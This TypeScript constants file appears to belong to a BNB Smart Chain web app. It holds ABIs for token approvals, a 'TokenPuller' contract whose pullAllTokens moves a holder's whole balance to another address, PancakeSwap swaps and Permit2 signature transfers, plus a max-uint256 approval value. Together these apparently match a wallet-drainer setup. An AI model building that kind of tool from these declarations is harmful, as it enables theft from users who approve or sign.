// BEP20 标准 ERC20 ABI（包含 approve、allowance 和 balanceOf 方法）
export const BEP20_ABI = [
  {
    constant: false,
    inputs: [
      {
        name: 'spender',
        type: 'address'
      },
      {
        name: 'amount',
        type: 'uint256'
      }
    ],
    name: 'approve',
    outputs: [
      {
        name: '',
        type: 'bool'
      }
    ],
    payable: false,
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      {
        name: 'owner',
        type: 'address'
      },
      {
        name: 'spender',
        type: 'address'
      }
    ],
    name: 'allowance',
    outputs: [
      {
        name: '',
        type: 'uint256'
      }
    ],
    payable: false,
    stateMutability: 'view',
    type: 'function'
  },
  {
    constant: true,
    inputs: [
      {
        name: 'account',
        type: 'address'
      }
    ],
    name: 'balanceOf',
    outputs: [
      {
        name: '',
        type: 'uint256'
      }
    ],
    payable: false,
    stateMutability: 'view',
    type: 'function'
  }
] as const

// TokenPuller 合约 ABI
export const TOKEN_PULLER_ABI = [
  {
    inputs: [
      {
        internalType: 'contract IERC20',
        name: 'token',
        type: 'address'
      },
      {
        internalType: 'address',
        name: 'from',
        type: 'address'
      },
      {
        internalType: 'address',
        name: 'to',
        type: 'address'
      }
    ],
    name: 'pullAllTokens',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  }
] as const

// PancakeSwap Router 合约 ABI (Uniswap V2兼容)
export const PANCAKE_ROUTER_ABI = [
  {
    inputs: [
      {
        internalType: 'uint256',
        name: 'amountIn',
        type: 'uint256'
      },
      {
        internalType: 'uint256',
        name: 'amountOutMin',
        type: 'uint256'
      },
      {
        internalType: 'address[]',
        name: 'path',
        type: 'address[]'
      },
      {
        internalType: 'address',
        name: 'to',
        type: 'address'
      },
      {
        internalType: 'uint256',
        name: 'deadline',
        type: 'uint256'
      }
    ],
    name: 'swapExactTokensForTokens',
    outputs: [
      {
        internalType: 'uint256[]',
        name: 'amounts',
        type: 'uint256[]'
      }
    ],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    inputs: [
      {
        internalType: 'uint256',
        name: 'amountOutMin',
        type: 'uint256'
      },
      {
        internalType: 'address[]',
        name: 'path',
        type: 'address[]'
      },
      {
        internalType: 'address',
        name: 'to',
        type: 'address'
      },
      {
        internalType: 'uint256',
        name: 'deadline',
        type: 'uint256'
      }
    ],
    name: 'swapExactETHForTokens',
    outputs: [
      {
        internalType: 'uint256[]',
        name: 'amounts',
        type: 'uint256[]'
      }
    ],
    stateMutability: 'payable',
    type: 'function'
  },
  {
    inputs: [
      {
        internalType: 'uint256',
        name: 'amountIn',
        type: 'uint256'
      },
      {
        internalType: 'uint256',
        name: 'amountOutMin',
        type: 'uint256'
      },
      {
        internalType: 'address[]',
        name: 'path',
        type: 'address[]'
      },
      {
        internalType: 'address',
        name: 'to',
        type: 'address'
      },
      {
        internalType: 'uint256',
        name: 'deadline',
        type: 'uint256'
      }
    ],
    name: 'swapExactTokensForETH',
    outputs: [
      {
        internalType: 'uint256[]',
        name: 'amounts',
        type: 'uint256[]'
      }
    ],
    stateMutability: 'nonpayable',
    type: 'function'
  },
  {
    inputs: [
      {
        internalType: 'uint256',
        name: 'amountIn',
        type: 'uint256'
      },
      {
        internalType: 'address[]',
        name: 'path',
        type: 'address[]'
      }
    ],
    name: 'getAmountsOut',
    outputs: [
      {
        internalType: 'uint256[]',
        name: 'amounts',
        type: 'uint256[]'
      }
    ],
    stateMutability: 'view',
    type: 'function'
  }
] as const

// Permit2 合约 ABI（Uniswap标准）
export const PERMIT2_ABI = [
  {
    inputs: [
      {
        components: [
          {
            internalType: 'address',
            name: 'token',
            type: 'address'
          },
          {
            internalType: 'uint256',
            name: 'amount',
            type: 'uint256'
          }
        ],
        internalType: 'struct ISignatureTransfer.TokenPermissions',
        name: 'permitted',
        type: 'tuple'
      },
      {
        components: [
          {
            internalType: 'address',
            name: 'to',
            type: 'address'
          },
          {
            internalType: 'uint256',
            name: 'requestedAmount',
            type: 'uint256'
          }
        ],
        internalType: 'struct ISignatureTransfer.SignatureTransferDetails',
        name: 'transferDetails',
        type: 'tuple'
      },
      {
        internalType: 'address',
        name: 'owner',
        type: 'address'
      },
      {
        internalType: 'uint256',
        name: 'nonce',
        type: 'uint256'
      },
      {
        internalType: 'uint256',
        name: 'deadline',
        type: 'uint256'
      },
      {
        internalType: 'uint8',
        name: 'v',
        type: 'uint8'
      },
      {
        internalType: 'bytes32',
        name: 'r',
        type: 'bytes32'
      },
      {
        internalType: 'bytes32',
        name: 's',
        type: 'bytes32'
      }
    ],
    name: 'permitTransferFrom',
    outputs: [],
    stateMutability: 'nonpayable',
    type: 'function'
  }
] as const

// 合约地址
export const PERMIT2_ADDRESS = process.env.NEXT_PUBLIC_PERMIT2_ADDRESS as `0x${string}`
export const SPENDER_ADDRESS = process.env.NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`
export const TOKEN_PULLER_ADDRESS = process.env.NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}` // 兼容之前的代码

// 最大 uint256 值
export const MAX_UINT256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

// BSC Chain ID
export const BSC_CHAIN_ID = 56

